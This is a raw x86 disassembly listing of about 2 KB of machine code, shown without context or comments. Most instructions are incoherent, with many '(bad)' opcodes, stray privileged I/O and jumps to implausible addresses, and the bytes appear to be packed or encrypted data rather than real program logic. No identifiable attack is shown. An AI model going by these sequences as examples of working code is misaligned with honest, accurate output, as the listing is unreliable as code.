  4093ba:	jbe    0x409408
  4093bc:	jnp    0x4093fb
  4093be:	das    
  4093bf:	inc    esp
  4093c0:	xor    DWORD PTR [esi+0x71],eax
  4093c3:	xor    edi,DWORD PTR [ecx]
  4093c5:	ds aaa 
  4093c7:	xor    al,0xbb
  4093c9:	jmp    eax
  4093cb:	js     0x40940d
  4093cd:	leave  
  4093ce:	cs ins BYTE PTR es:[edi],dx
  4093d0:	xor    BYTE PTR [ebp-0xcfb3e7],dh
  4093d6:	adc    esp,edi
  4093d8:	push   0x16ff
	...
  4093e9:	add    BYTE PTR [edx+ecx*8-0x9],dl
  4093ed:	add    bl,bh
  4093ef:	xor    BYTE PTR [ebp+0x5],dh
  4093f2:	dec    edi
  4093f3:	mov    cl,0x79
  4093f5:	jmp    0xe602d25a
  4093fa:	pusha  
  4093fb:	fimul  DWORD PTR [edx-0x3b61e03]
  409401:	push   ebx
  409402:	addr16 fwait
  409404:	pop    ss
  409405:	ficom  WORD PTR [ebx]
  409407:	or     eax,ebp
  409409:	sub    eax,0x60ff3042
  40940e:	mov    ds:0xbfc9682c,eax
  409413:	(bad)  
  409416:	mov    bl,0xd9
  409418:	sub    BYTE PTR [eax],ch
  40941a:	xor    BYTE PTR [di-0x1f],dh
  40941e:	js     0x40940a
  409420:	(bad)  
  409421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409422:	push   ebp
  409423:	popf   
  409424:	fnstsw ax
  409426:	lahf   
  409427:	xor    BYTE PTR [edi-0x15],ah
  40942a:	pusha  
  40942b:	add    eax,0x8d38e80
  409430:	call   0xff70ca0f
  409435:	adc    DWORD PTR [esi],esi
  409437:	out    dx,al
  409438:	inc    eax
  409439:	jmp    0xc0958e73
  40943e:	lahf   
  40943f:	xor    dh,bh
  409441:	fsubr  QWORD PTR [eax+0x1d]
  409444:	add    BYTE PTR [esi-0x73],bl
  409447:	xor    BYTE PTR [eax+0x50],ch
  40944a:	dec    edi
  40944b:	(bad)  
	...
  40945a:	add    BYTE PTR [eax],al
  40945c:	add    BYTE PTR [edx+0x5],ah
  40945f:	add    BYTE PTR [eax],al
  409461:	retf   0x74f7
  409464:	or     BYTE PTR [edx+0x75fffdea],dl
  40946a:	div    DWORD PTR [esp+edi*8+0x75]
  40946e:	jne    0x409477
  409470:	call   0x3f39ad
  409475:	push   ebx
  409476:	mov    BYTE PTR [ebx],0x0
  409479:	iret   
  40947a:	jp     0x409468
  40947c:	(bad)  
  40947d:	out    dx,eax
  40947e:	pop    es
  40947f:	call   0xff382678
  409484:	or     ecx,DWORD PTR [edx+0x60]
  409487:	cmp    BYTE PTR [eax+0x1c],ch
  40948a:	cs inc eax
  40948c:	add    dl,cl
  40948e:	fisttp DWORD PTR [eax+0x4ff9c5ab]
  409494:	push   eax
  409495:	xor    cl,BYTE PTR [ecx]
  409497:	add    bh,ch
  409499:	hlt    
  40949a:	pusha  
  40949b:	sbb    edi,DWORD PTR [edx]
  40949d:	jnp    0x4094a8
  40949f:	push   eax
  4094a0:	(bad)  
  4094a1:	jg     0x4094a4
  4094a3:	call   0xff3a9af8
  4094a8:	pop    eax
  4094a9:	and    al,BYTE PTR [eax+eax*1]
  4094ac:	out    dx,eax
  4094ad:	xor    al,0x61
  4094af:	and    BYTE PTR [edx],bh
  4094b1:	dec    ebx
  4094b2:	or     DWORD PTR [eax-0x1],edx
  4094b5:	outs   dx,DWORD PTR ds:[esi]
  4094b6:	add    eax,ebp
  4094b8:	cmp    al,0xc6
  4094ba:	stc    
  4094bb:	(bad)  
  4094bc:	call   0x3f6723
	...
  4094cd:	add    BYTE PTR [eax],al
  4094cf:	add    BYTE PTR [ebx+0x4f0007c2],dh
  4094d5:	jle    0x4094c3
  4094d7:	cmp    DWORD PTR [esi+0x600069ec],0xc
  4094de:	push   DWORD PTR [ebp+0x52]
  4094e1:	fisttp DWORD PTR [ecx-0x77074a5c]
  4094e7:	inc    ebp
  4094e8:	arpl   ax,bx
  4094ea:	test   eax,0xb5a4419
  4094ef:	call   0xff755cca
  4094f4:	leave  
  4094f5:	sti    
  4094f6:	xor    al,0x75
  4094f8:	pop    ebx
  4094f9:	les    ecx,FWORD PTR [eax-0x561fdb01]
  4094ff:	sbb    ebx,DWORD PTR [edx+edx*4]
  409502:	or     ebp,eax
  409504:	loop   0x409515
  409506:	xor    eax,0x37920cff
  40950b:	dec    DWORD PTR [esi-0x385bd4dc]
  409511:	pop    es
  409512:	xor    eax,0x32921c9
  409517:	push   ebp
  409518:	fmul   DWORD PTR [eax]
  40951a:	add    esp,0xbae1fe7
  409520:	retf   
  409521:	mov    ebx,0x33d4ff68
  409526:	inc    ebx
  409527:	movntq QWORD PTR [ebx+0x3],mm7
  40952b:	add    BYTE PTR [ebx-0x5b],ah
  40952e:	mov    ebp,0x13c9e0fb
	...
  409543:	das    
  409544:	push   ds
  409545:	xor    al,0x75
  409547:	push   ebx
  409548:	ja     0x4094f8
  40954a:	sti    
  40954b:	mov    ebx,0x9cff6943
  409550:	mov    ch,0xbd
  409552:	sti    
  409553:	or     ebx,ebp
  409555:	stc    
  409556:	inc    eax
  409557:	arpl   WORD PTR [edi-0x58840452],dx
  40955d:	push   0xac0c7cff
  409562:	push   DWORD PTR [edi+edi*2+0x75]
  409566:	push   eax
  409567:	ins    BYTE PTR es:[edi],dx
  409568:	xor    DWORD PTR [ebx],ecx
  40956a:	call   0xff74fa0f
  40956f:	dec    ebx
  409570:	add    eax,0x2e545d3d
  409575:	shl    DWORD PTR [edx+ecx*4-0x31cb173c],1
  40957c:	xor    DWORD PTR [ecx-0x63],eax
  40957f:	or     ch,BYTE PTR [esi]
  409581:	inc    esi
  409582:	sar    DWORD PTR [esp+eax*1-0x2b12db17],cl
  409589:	xor    eax,0x8b1d5cae
  40958e:	dec    ebx
  40958f:	sbb    al,0x2e
  409591:	adc    DWORD PTR [eax-0x43],esi
  409594:	sub    eax,0xebb7ab1e
  409599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40959a:	add    eax,DWORD PTR [eax+edi*4]
  40959d:	or     al,0x2b
  40959f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a0:	pop    ebx
  4095a1:	push   es
  4095a2:	xor    al,0x93
  4095a4:	popf   
  4095a5:	call   0x4095ad
	...
  4095b6:	cld    
  4095b7:	outs   dx,BYTE PTR ds:[esi]
  4095b8:	cdq    
  4095b9:	xor    al,0x6e
  4095bb:	std    
  4095bc:	add    BYTE PTR [edx+0x1ce62dab],al
  4095c2:	icebp  
  4095c3:	data16 fidiv WORD PTR [ebx]
  4095c6:	cmp    eax,DWORD PTR [edi+0x2ec4c513]
  4095cc:	push   esp
  4095cd:	xor    bl,cl
  4095cf:	call   0xd4f4c966
  4095d4:	push   eax
  4095d5:	add    eax,0xd4771e63
  4095da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095db:	mov    bh,0xe0
  4095dd:	sbb    eax,DWORD PTR [ebx]
  4095df:	cmp    eax,0xb38b33a6
  4095e4:	inc    esi
  4095e5:	xor    ecx,DWORD PTR [ebp+ebp*1-0x6484cfe4]
  4095ec:	inc    esi
  4095ed:	xor    edi,DWORD PTR [ebx+edi*1-0x55]
  4095f1:	add    BYTE PTR [ebx-0x28],ah
  4095f4:	jno    0x409616
  4095f6:	loopne 0x409640
  4095f8:	add    BYTE PTR [ebp-0x3b],dh
  4095fb:	sub    eax,0xb291d369
  409600:	pop    es
  409601:	push   ecx
  409602:	aam    0x68
  409604:	call   FWORD PTR [esi-0x32]
  409607:	ret    0xc3fb
  40960a:	pusha  
  40960b:	lahf   
  40960c:	sbb    DWORD PTR [esi-0x6],ecx
  40960f:	add    al,0xe8
  409611:	or     esi,DWORD PTR [eax+0x2c]
  409614:	call   ebx
  409616:	pusha  
  409617:	lahf   
  409618:	and    dh,BYTE PTR [esi]
	...
  409626:	add    BYTE PTR [eax],al
  409628:	add    dl,ch
  40962a:	add    al,0xe8
  40962c:	xlat   BYTE PTR ds:[ebx]
  40962d:	push   ecx
  40962e:	sub    al,0xff
  409630:	xchg   ebx,eax
  409631:	pusha  
  409632:	lahf   
  409633:	sbb    ebx,DWORD PTR [esi]
  409635:	retf   0xe804
  409638:	jecxz  0x40968b
  40963a:	sub    al,0xff
  40963c:	add    DWORD PTR [ebp-0x2916bf11],0xe874ff0e
  409646:	and    al,0xfb
  409648:	div    DWORD PTR [ecx]
  40964a:	sub    al,0x68
  40964c:	dec    edx
  40964d:	int    0xc5
  40964f:	call   DWORD PTR [edx-0x44]
  409652:	sub    esi,DWORD PTR [ebp-0xf]
  409655:	push   0x91d6fe19
  40965a:	popf   
  40965b:	mov    ds:0x692ca613,al
  409660:	in     eax,0x71
  409662:	mov    dl,0x7
  409664:	rcl    DWORD PTR [ebx],1
  409666:	sub    edi,edi
  409668:	mov    dh,0x71
  40966a:	mov    dl,0xfb
  40966c:	scas   al,BYTE PTR es:[edi]
  40966d:	fild   DWORD PTR [eax+ebp*8]
  409670:	sbb    edi,esp
  409672:	sub    edi,edi
  409674:	mov    al,0x26
  409676:	add    DWORD PTR [eax],eax
  409678:	cmp    al,0x4
  40967a:	sbb    DWORD PTR [ecx-0xcba75b],eax
  409680:	add    ch,bl
  409682:	test   DWORD PTR [ebp-0x4],eax
  409685:	dec    edx
  409686:	clc    
  409687:	je     0x409699
  409689:	in     eax,dx
  40968a:	ins    BYTE PTR es:[edi],dx
  40968b:	or     ebp,eax
	...
  409699:	add    BYTE PTR [eax],al
  40969b:	add    BYTE PTR [edx],dl
  40969d:	pusha  
  40969e:	(bad)  
  40969f:	call   DWORD PTR [ecx-0x38]
  4096a2:	push   cs
  4096a3:	test   DWORD PTR ds:0x75000001,eax
  4096a9:	cmp    eax,0x84a00f7
  4096ae:	add    bh,al
  4096b0:	pop    es
  4096b1:	hlt    
  4096b2:	inc    BYTE PTR [edi]
  4096b4:	cmp    cl,BYTE PTR [eax]
  4096b6:	push   0x0
  4096b8:	and    BYTE PTR [eax],cl
  4096ba:	push   0x0
  4096bc:	and    BYTE PTR [eax],cl
  4096be:	lea    eax,[ebp+0x76]
  4096c1:	pop    eax
  4096c2:	mov    WORD PTR [ebp-0x1108a],es
  4096c8:	retf   0x74f6
  4096cb:	clc    
  4096cc:	ins    DWORD PTR es:[edi],dx
  4096cd:	ins    DWORD PTR es:[edi],dx
  4096ce:	sti    
  4096cf:	call   0x3ff6c4
  4096d4:	icebp  
  4096d5:	(bad)  
  4096d6:	jae    0x4096dd
  4096d8:	arpl   WORD PTR [edx],bp
  4096da:	add    BYTE PTR [eax],al
  4096dc:	retf   0xc58f
  4096df:	sub    BYTE PTR [ebx-0x358a00ff],cl
  4096e5:	cvtps2pi mm5,QWORD PTR [ecx-0x74b00a53]
  4096ec:	cli    
  4096ed:	stos   DWORD PTR es:[edi],eax
  4096ee:	test   ah,dh
  4096f0:	cmc    
  4096f1:	cmc    
  4096f2:	(bad)  
  4096f3:	push   eax
  4096f4:	dec    eax
  4096f5:	or     DWORD PTR ds:0x88f5eda9,ebx
  4096fb:	test   edx,ebx
  4096fd:	in     eax,dx
  4096fe:	(bad)  
  4096ff:	inc    DWORD PTR [eax]
	...
  40970d:	add    BYTE PTR [eax],al
  40970f:	bnd jno 0x4096b6
  409712:	(bad)  
  409713:	in     eax,dx
  409714:	mov    bh,bh
  409716:	arpl   WORD PTR [bx+si],sp
  409719:	in     al,dx
  40971a:	inc    eax
  40971b:	arpl   WORD PTR [ebx+0x77],di
  40971e:	lock ins BYTE PTR es:[edi],dx
  409720:	xor    BYTE PTR [ecx],0xff
  409723:	neg    BYTE PTR [ecx]
  409725:	sbb    esi,DWORD PTR [esi-0x45]
  409728:	mov    dl,0x30
  40972a:	mov    esi,esp
  40972c:	test   al,0x38
  40972e:	call   DWORD PTR [edi+edx*2+0x3]
  409732:	push   0xffc2e75d
  409737:	inc    ebp
  409738:	mov    dh,BYTE PTR [edi+esi*8]
  40973b:	cmp    al,0xbc
  40973d:	xor    BYTE PTR [ebp+0x67],dh
  409740:	aam    0xcc
  409742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409743:	sub    al,0xec
  409745:	jp     0x4096cc
  409747:	cmp    ebp,esp
  409749:	xor    bh,bh
  40974b:	loopne 0x4096e6
  40974d:	pop    ds
  40974e:	not    DWORD PTR [esp+eiz*8]
  409751:	add    esi,DWORD PTR [ebx+edx*2-0x6c]
  409755:	add    eax,DWORD PTR [eax]
  409757:	hlt    
  409758:	rcr    BYTE PTR [ebx+0x35d39c9],cl
  40975e:	jmp    FWORD PTR [esi-0x1300c6f0]
  409764:	sub    esi,DWORD PTR [esi+0x3b07fb07]
  40976a:	(bad)  
  40976b:	fadd   QWORD PTR [edx+eax*1-0x649d3c00]
  409772:	rol    DWORD PTR [eax],cl
	...
  409780:	add    BYTE PTR [eax],al
  409782:	mov    ebp,ebx
  409784:	add    edi,edi
  409786:	push   cs
  409787:	inc    ecx
  409788:	cmp    bh,bh
  40978a:	mov    esp,0xcb07b63b
  40978f:	(bad)  
  409790:	cmp    bh,bh
  409792:	lods   al,BYTE PTR ds:[esi]
  409793:	lahf   
  409794:	ins    DWORD PTR es:[edi],dx
  409795:	call   0x710b46
  40979a:	pop    ss
  40979b:	sub    al,0x9b
  40979d:	call   DWORD PTR [ebp+eax*1+0x3efb7196]
  4097a4:	jecxz  0x409768
  4097a6:	test   BYTE PTR [ebx],ch
  4097a8:	pop    esp
  4097a9:	sbb    esi,DWORD PTR [edx+ebp*1-0x72]
  4097ad:	xor    dh,ch
  4097af:	cld    
  4097b0:	nop
  4097b1:	jne    0x40974d
  4097b3:	sub    bh,BYTE PTR [esi-0x65]
  4097b6:	arpl   WORD PTR ds:0x51cb7186,ax
  4097bc:	mov    bl,0xc2
  4097be:	push   esp
  4097bf:	sub    ebx,DWORD PTR [ebx+ebx*1+0x305e2a54]
  4097c6:	into   
  4097c7:	std    
  4097c8:	inc    eax
  4097c9:	lea    ebp,[edx]
  4097cb:	sub    cl,BYTE PTR [esi+0x30]
  4097ce:	out    dx,al
  4097cf:	sbb    BYTE PTR [esi],bh
  4097d1:	xor    BYTE PTR [ebx*1+0x2a246729],ch
  4097d8:	ss jbe 0x4097e6
  4097db:	xor    ch,BYTE PTR [esi]
  4097dd:	xor    BYTE PTR [ebx],cl
  4097df:	jo     0x40982e
  4097e1:	xor    BYTE PTR [edx+ebp*1],cl
  4097e4:	push   esp
  4097e5:	xor    eax,DWORD PTR [eax]
	...
  4097f3:	add    BYTE PTR [eax],al
  4097f5:	or     al,0x2a
  4097f7:	push   ss
  4097f8:	xor    BYTE PTR [esi-0x7],dh
  4097fb:	or     eax,0x3d1d5cb6
  409800:	xor    esp,ebp
  409802:	sub    esi,edi
  409804:	jne    0x4097f9
  409806:	xor    esi,esi
  409808:	das    
  409809:	retf   
  40980a:	mov    eax,DWORD PTR [ebp+0x30]
  40980d:	aam    0x29
  40980f:	sub    al,0x2c
  409811:	mov    edx,0xc42fdf3c
  409816:	sub    DWORD PTR [eax+esi*1-0x35],ebx
  40981a:	and    eax,0x3c630457
  40981f:	stos   DWORD PTR es:[edi],eax
  409820:	add    BYTE PTR [ebx-0x30],ah
  409823:	jno    0x409845
  409825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409826:	scas   eax,DWORD PTR es:[edi]
  409827:	jmp    esp
  409829:	js     0x409867
  40982b:	test   al,0xae
  40982d:	inc    esp
  40982e:	(bad)  
  40982f:	mov    edi,0xdda17e1d
  409834:	jecxz  0x4097d5
  409836:	sub    DWORD PTR [edi-0x7f],ecx
  409839:	lods   eax,DWORD PTR ds:[esi]
  40983a:	popa   
  40983b:	dec    DWORD PTR [esi-0x16984671]
  409841:	pusha  
  409842:	sbb    bh,BYTE PTR [esi+0x40ef2911]
  409848:	jmp    0xe1b5c07d
  40984d:	js     0x409831
  40984f:	enter  0x7c66,0xcd
  409853:	addr16 call 0xc1feb0b9
	...
  409865:	add    BYTE PTR [eax],al
  409867:	add    BYTE PTR [ebx+ebp*8+0x2810e940],dl
  40986e:	jne    0x409861
  409870:	dec    eax
  409871:	push   ss
  409872:	leave  
  409873:	ds je  0x409893
  409876:	cmp    eax,0xc9284c8d
  40987b:	sub    edx,DWORD PTR [edi]
  40987d:	sub    DWORD PTR [edx+esi*2+0x43],edx
  409881:	test   ah,al
  409883:	sbb    eax,0xe969d02d
  409888:	fimul  DWORD PTR [ebx]
  40988a:	call   DWORD PTR [eax+edi*8+0x3c485d20]
  409891:	sub    BYTE PTR [ecx+0x357c34a4],cl
  409897:	xchg   DWORD PTR [eax-0x2d9e003b],edi
  40989d:	mov    dh,0x27
  40989f:	sub    BYTE PTR [edi-0x7b],ah
  4098a2:	aas    
  4098a3:	jmp    0xe9fc1d6d
  4098a8:	pusha  
  4098a9:	add    eax,0xc5ca8e68
  4098ae:	(bad)  
  4098af:	dec    DWORD PTR [ecx+ecx*1-0x50]
  4098b3:	jbe    0x40986f
  4098b5:	add    al,0xb
  4098b7:	rcr    BYTE PTR [esi+0x67],0x3f
  4098bb:	adc    BYTE PTR [edx-0x27bf0fc],0x3
  4098c2:	add    BYTE PTR [eax],al
  4098c4:	dec    edx
  4098c5:	mov    DWORD PTR [esi-0x17feb4c6],edi
  4098cb:	in     eax,dx
	...
  4098d8:	add    BYTE PTR [eax],al
  4098da:	add    BYTE PTR [esi+0x1],cl
  4098dd:	add    BYTE PTR [edx+0x79],bl
  4098e0:	(bad)  
  4098e1:	dec    edi
  4098e2:	call   0x3f3dfa
  4098e7:	jp     0x40993a
  4098e9:	add    BYTE PTR [bp+si+0x7],cl
  4098ed:	mov    esi,0x401e9068
  4098f2:	add    BYTE PTR [edx],cl
  4098f4:	xlat   BYTE PTR ds:[ebx]
  4098f5:	je     0x4098ff
  4098f7:	mov    ds:0xa5ffc87e,al
  4098fc:	cmp    al,0x67
  4098fe:	add    DWORD PTR [edx],edi
  409900:	pop    es
  409901:	mov    esi,0x401e4e68
  409906:	add    dl,bh
  409908:	(bad)  
  409909:	je     0x409913
  40990b:	mov    ds:0x45ffc882,al
  409910:	or     al,0xb2
  409912:	mov    ds:0x43ead765,eax
  409917:	loop   0x4098c7
  409919:	cmp    DWORD PTR [ecx+0xa],eax
  40991c:	dec    edi
  40991d:	out    0x41,eax
  40991f:	ins    BYTE PTR es:[edi],dx
  409920:	add    al,0x0
  409922:	or     edi,DWORD PTR [edx]
  409924:	jo     0x409959
  409926:	push   esi
  409927:	bound  esp,QWORD PTR [eax-0x54]
  40992a:	inc    ebp
  40992c:	push   edx
  40992d:	dec    edi
  40992e:	push   0xbeef03ba
  409933:	xor    ch,bl
  409935:	cmp    DWORD PTR [ecx+0x63],eax
  409938:	push   ds
  409939:	sar    esi,cl
  40993b:	cs sbb edx,DWORD PTR es:[ebp+0x0]
	...
  40994c:	add    BYTE PTR [eax],al
  40994e:	fwait
  40994f:	ds sub eax,0x31d3b58
  409955:	out    dx,eax
  409956:	ffree  st(5)
  409958:	push   edi
  409959:	cmp    ah,BYTE PTR [edx]
  40995b:	push   ds
  40995c:	sar    esi,cl
  40995e:	push   ss
  40995f:	sbb    eax,DWORD PTR ss:[ecx-0x65]
  409963:	xchg   BYTE PTR ds:0x2cbb0ee8,ch
  409969:	dec    DWORD PTR [eax+0x2d7fc51c]
  40996f:	push   ds
  409970:	mov    dh,0xf9
  409972:	sbb    eax,0x1abff0aa
  409977:	mov    al,0x2c
  409979:	call   DWORD PTR [ebx+ebp*4+0x5d]
  40997d:	cmp    BYTE PTR [edi+ebp*1-0x7a],ah
  409981:	inc    ebp
  409982:	inc    esp
  409983:	enter  0x6a2c,0x59
  409987:	iret   
  409988:	mov    dh,0x7
  40998a:	dec    ebx
  40998b:	fsubr  QWORD PTR ds:0xe0532cff
  409991:	(bad)  
  409992:	scas   al,BYTE PTR es:[edi]
  409993:	xor    al,0x1b
  409995:	mov    ecx,0x6a2cf01d
  40999a:	ja     0x409973
  40999c:	mov    dh,0x7
  40999e:	sti    
  40999f:	iret   
  4099a0:	sub    eax,0x339504ff
  4099a5:	cmp    ah,BYTE PTR [edx-0x71cad3e4]
  4099ab:	inc    ebp
  4099ac:	ret    0xedff
  4099af:	test   eax,0xe7fa
	...
  4099c0:	add    BYTE PTR [edx],dh
  4099c2:	sub    DWORD PTR [edi+edi*8],ebp
  4099c5:	dec    ebx
  4099c6:	sub    al,0xe9
  4099c8:	inc    eax
  4099c9:	arpl   WORD PTR [ecx+eax*1+0x69056300],ax
  4099d0:	sub    al,0x4e
  4099d2:	std    
  4099d3:	ror    BYTE PTR [esi+edi*4],1
  4099d6:	es (bad) 
  4099d8:	sub    al,0x2e
  4099da:	sub    esi,ecx
  4099dc:	mov    dh,0x64
  4099de:	sbb    eax,0x26a4636b
  4099e3:	push   ds
  4099e4:	into   
  4099e5:	stos   DWORD PTR es:[edi],eax
  4099e6:	inc    ebx
  4099e7:	in     eax,dx
  4099e8:	add    ebp,DWORD PTR [esi]
  4099ea:	jp     0x4099a9
  4099ec:	and    BYTE PTR [edi-0x7bd361ab],0x78
  4099f3:	and    al,0x30
  4099f5:	adc    esp,DWORD PTR [esi]
  4099f7:	sbb    al,0x14
  4099f9:	je     0x4099ab
  4099fb:	fcomp  QWORD PTR [ebx]
  4099fd:	and    eax,0x5803e8b0
  409a02:	inc    ebp
  409a03:	out    dx,al
  409a04:	xchg   BYTE PTR [ecx+0x1c03e903],ah
  409a0a:	shl    BYTE PTR [eax+0x3],0x63
  409a0e:	add    eax,0x319e44e9
  409a13:	pop    esi
  409a14:	add    al,0x63
  409a16:	add    eax,0x5c903c3
  409a1b:	ret    
  409a1c:	add    edi,DWORD PTR [ecx+0x30c67405]
  409a22:	aad    0x6b
  409a24:	xchg   BYTE PTR [eax],al
	...
  409a32:	add    BYTE PTR [eax],al
  409a34:	pop    ss
  409a35:	cs ss sub al,0xb3
  409a39:	es mov ah,0x2b
  409a3c:	or     al,0xb0
  409a3e:	and    al,0x1b
  409a40:	imul   esi,DWORD PTR [eax+0x456803e8],0xffffff9d
  409a47:	push   es
  409a48:	or     al,BYTE PTR [eax]
  409a4a:	jmp    0x409a4f
  409a4c:	arpl   WORD PTR [ebp+0x5a3db2e],bx
  409a52:	(bad)  
  409a53:	mov    ch,0x6c
  409a55:	sbb    eax,0x263eb200
  409a5a:	call   FWORD PTR [ecx+0x6c8d554b]
  409a60:	xchg   ebx,eax
  409a61:	cs (bad) 
  409a63:	ficom  WORD PTR [edi+0x4102e7d3]
  409a69:	jmp    DWORD PTR es:[eax-0x1e]
  409a6d:	xor    al,0xf7
  409a6f:	(bad)  
  409a70:	js     0x409a8f
  409a72:	or     DWORD PTR [ebx-0x1695d9b8],0x283b0ff8
  409a7c:	addr16 es mov ch,0x99
  409a80:	push   eax
  409a81:	call   FWORD PTR es:[esi+0x6de7f9b2]
  409a88:	add    ah,BYTE PTR [esi]
  409a8a:	jmp    DWORD PTR [eax-0x1e]
  409a8d:	and    bh,dh
  409a8f:	xchg   BYTE PTR [eax],bh
  409a91:	fwait
  409a92:	call   DWORD PTR [eax]
  409a94:	push   0xe940e0
	...
  409aa5:	add    BYTE PTR [eax],al
  409aa7:	mov    DWORD PTR [edx-0x10],ebx
  409aaa:	jbe    0x409b24
  409aac:	and    al,0xff
  409aae:	fmul   QWORD PTR [ebp+ebp*1+0x69]
  409ab2:	test   BYTE PTR [eax+0x5b6c8924],cl
  409ab8:	sbb    al,0xff
  409aba:	dec    esi
  409abb:	int    0x24
  409abd:	adc    DWORD PTR [si],esi
  409ac0:	(bad)  
  409ac1:	(bad)  
  409ac2:	cmp    eax,0x36f71592
  409ac7:	dec    eax
  409ac8:	and    al,0x75
  409aca:	(bad)  [eax-0x2d]
  409acd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ace:	cmp    BYTE PTR es:[esi+0x24301185],cl
  409ad5:	inc    DWORD PTR [ebx-0x2dcf52a0]
  409adb:	daa    
  409adc:	and    eax,0xd92700fe
  409ae1:	idiv   bh
  409ae3:	fucomp st(7)
  409ae5:	je     0x409af3
  409ae7:	bound  ebx,QWORD PTR [esp+eiz*4]
  409aea:	(bad)  
  409aeb:	mov    ebp,0xa5dc84a1
  409af0:	out    dx,eax
  409af1:	dec    BYTE PTR [ebp-0x917b9]
  409af7:	lea    edi,[eax]
  409af9:	addr16 inc ecx
  409afb:	push   ecx
  409afc:	dec    edx
  409afd:	(bad)  
  409afe:	(bad)  
  409aff:	daa    
  409b00:	fdiv   st,st(6)
  409b02:	(bad)  
  409b03:	fucomp st(7)
  409b05:	xor    al,0x55
  409b07:	arpl   WORD PTR [edx-0x1],cx
  409b0a:	out    0x0,eax
	...
  409b18:	add    BYTE PTR [eax],al
  409b1a:	stos   BYTE PTR es:[edi],al
  409b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b1c:	(bad)  
  409b1d:	call   DWORD PTR [ecx+0x91973c8]
  409b23:	lods   eax,DWORD PTR ds:[esi]
  409b24:	fcomip st,st(7)
  409b26:	int    0xef
  409b28:	add    esi,DWORD PTR [ebp+0x6a]
  409b2b:	out    dx,eax
  409b2c:	das    
  409b2d:	(bad)  
  409b2e:	test   edi,0x38ddfff6
  409b34:	out    0xdd,eax
  409b36:	stos   DWORD PTR es:[edi],eax
  409b37:	out    dx,eax
  409b38:	(bad)  
  409b39:	jmp    0x409b71
  409b3b:	and    edi,DWORD PTR [edi-0x18c7cb8c]
  409b41:	shr    ebx,1
  409b43:	out    dx,al
  409b44:	inc    bh
  409b46:	(bad)  
  409b47:	shl    dh,1
  409b49:	call   FWORD PTR [ebp+0x3afffff5]
  409b4f:	popf   
  409b50:	test   al,dl
  409b52:	push   ebp
  409b53:	out    dx,eax
  409b54:	(bad)  
  409b55:	push   eax
  409b56:	and    bl,BYTE PTR [edx+edi*1+0x41]
  409b5a:	cli    
  409b5b:	out    dx,al
  409b5c:	mov    ah,0xf0
  409b5e:	gs out dx,eax
  409b60:	(bad)  
  409b61:	call   edi
  409b63:	sbb    esp,edi
  409b65:	lds    esp,FWORD PTR [ebx-0x2e]
  409b68:	sub    edi,edi
  409b6a:	fisubr DWORD PTR [eax+0xae4f74e]
  409b70:	xchg   BYTE PTR [ebp-0xd6e539],bh
  409b76:	arpl   WORD PTR [ebx],bp
  409b78:	jg     0x409b15
  409b7a:	arpl   WORD PTR [esi],bp
  409b7c:	add    eax,DWORD PTR [ebx+0x0]
	...
  409b8a:	add    BYTE PTR [eax],al
  409b8c:	add    BYTE PTR [esi],al
  409b8e:	cmp    dh,BYTE PTR [ecx]
  409b90:	(bad)  
  409b91:	mov    esp,0xe583f82d
  409b96:	sub    eax,0x90e00003
  409b9b:	sbb    al,0xf7
  409b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b9e:	dec    edx
  409b9f:	add    al,0xf
  409ba1:	out    0xac,eax
  409ba3:	add    eax,DWORD PTR [eax]
  409ba5:	arpl   si,ax
  409ba7:	adc    eax,DWORD PTR [eax]
  409ba9:	jl     0x409b5e
  409bab:	sub    BYTE PTR [ebp+0x5b],dh
  409bae:	jbe    0x409bd8
  409bb0:	popf   
  409bb1:	jl     0x409b35
  409bb3:	sub    DWORD PTR [ebp-0xd67d79],esi
  409bb9:	ins    BYTE PTR es:[edi],dx
  409bba:	clc    
  409bbb:	sti    
  409bbc:	out    0x13,eax
  409bbe:	lods   al,BYTE PTR ds:[esi]
  409bbf:	sub    bh,bh
  409bc1:	pop    esp
  409bc2:	ficomp DWORD PTR [ebx]
  409bc4:	not    DWORD PTR [esp+ebx*4+0x28]
  409bc8:	jne    0x409c25
  409bca:	test   dh,al
  409bcc:	popf   
  409bcd:	inc    esp
  409bce:	lods   al,BYTE PTR ds:[esi]
  409bcf:	sub    BYTE PTR [ebp-0xd743b9],dh
  409bd5:	xor    al,0x42
  409bd7:	sti    
  409bd8:	out    0x77,eax
  409bda:	mov    dl,0x28
  409bdc:	jmp    DWORD PTR [edx+eiz*4]
  409bdf:	dec    ebx
  409be0:	neg    DWORD PTR [esp+eiz*8]
  409be3:	sub    BYTE PTR [ebp+0x6b],dh
  409be6:	les    edi,FWORD PTR [edi]
  409be8:	popf   
  409be9:	or     al,0xf4
  409beb:	sub    BYTE PTR [ebp+0x291e0627],dh
	...
  409bfd:	add    BYTE PTR [eax],al
  409bff:	add    ah,bh
  409c01:	and    dl,BYTE PTR [ebx+edi*8+0x2976fdfc]
  409c08:	in     al,dx
  409c09:	xchg   BYTE PTR [eax+edx*2-0x14],cl
  409c0d:	and    al,BYTE PTR [esi]
  409c0f:	add    al,0x57
  409c11:	(bad)  
  409c12:	imul   esp,DWORD PTR [edi-0x4d],0x6728f61a
  409c19:	cwde   
  409c1a:	fidivr DWORD PTR [esi+ebx*8+0x39]
  409c1e:	fisubr WORD PTR [eax]
  409c20:	mov    esp,0x2e291922
  409c25:	or     eax,0x22ce8fc1
  409c2a:	into   
  409c2b:	sbb    al,0x59
  409c2d:	scas   eax,DWORD PTR es:[edi]
  409c2e:	call   0xd14db25b
  409c33:	jnp    0x409c2b
  409c35:	and    dh,BYTE PTR [esi-0x49d629d8]
  409c3b:	sub    BYTE PTR [ebp+ebp*1+0x227c639d],al
  409c42:	sahf   
  409c43:	outs   dx,BYTE PTR ds:[esi]
  409c44:	xchg   DWORD PTR [edx],ebx
  409c46:	xchg   esi,eax
  409c47:	sub    BYTE PTR [ebx+0x2c],bh
  409c4a:	dec    ecx
  409c4b:	sub    BYTE PTR [edx+eiz*1+0x3c],ah
  409c4f:	sbb    edx,DWORD PTR [edx+eiz*1+0x7e]
  409c53:	sbb    esi,DWORD PTR ds:0x4c287665
  409c59:	pop    eax
